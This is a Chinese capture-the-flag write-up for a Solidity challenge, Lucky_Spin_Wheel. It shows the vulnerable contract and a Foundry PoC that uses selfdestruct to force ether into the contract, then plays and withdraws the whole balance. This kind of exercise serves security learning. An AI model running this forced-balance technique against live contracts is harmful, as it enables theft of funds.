---
title: "Lucky_Spin_Wheel"
date: 2026-07-20
draft: false
description: "利用 selfdestruct 控制合约余额"
tags:
  - Ethernaut
  - selfdestruct
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## Lucky_Spin_Wheel

### 目标：

初始金额为0.91，令合约中的余额为1，使isGameComplete为true

### 思路：

找到`isSolved()`函数，从结果倒推，找到使`isGameComplete`为`true`的条件，发现使`address(this).balance == 1 ether` 即可,但是每次只能往合约里注入0.05 ether，最后合约余额不可能恰好为1 ether，所以可以利用自毁函数`selfdestruct`往合约中注入0.04 ether，使合约余额为0.95 ether，然后正常执行合约，利用`withdraw()`函数提出所得的奖励。

### 源码：

注：合约原金额为0.91

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Lucky_Spin_Wheel {

    uint public payoutMileStone1 = 0.3 ether;
    uint public mileStone1Reward = 0.2 ether;
    uint public payoutMileStone2 = 0.5 ether;
    uint public mileStone2Reward = 0.3 ether;
    uint public finalMileStone = 1 ether;
    uint public finalReward = 0.5 ether;
    bool public isGameComplete = false;
    mapping(address => uint) redeemableEther;

    constructor() payable {}

    function play() external payable {
        require(msg.value == 0.05 ether); 

        require(address(this).balance <= finalMileStone);
        
        if (address(this).balance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (address(this).balance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (address(this).balance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
            isGameComplete = true;
        }
        return;
    }
    function withdraw() external {
        require(isGameComplete,"YOU FAILED");
        require(redeemableEther[msg.sender] > 0,"YOU HAVE NO REWARD");
        uint256 amount = address(this).balance;
        redeemableEther[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    function isSolved() external view returns (bool) {
        require(address(this).balance == 0,"Try again");
        return isGameComplete;
    }
}
```

### poc

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "forge-std/Script.sol";

interface ITarget {
    function play() external payable;
    function withdraw() external;
}

contract Destruct {
    constructor() payable {
        selfdestruct(payable(0x742d35Cc6634C0532925a3b844Bc9e90F1A043B8));
    }
}

contract Attack is Script {

    function run() external {
        vm.startBroadcast();

        new Destruct{value: 0.04 ether}();

        ITarget target = ITarget(0x742d35Cc6634C0532925a3b844Bc9e90F1A043B8);

        target.play{value: 0.05 ether}();
        target.withdraw();
        
        vm.stopBroadcast();
    }
}
```
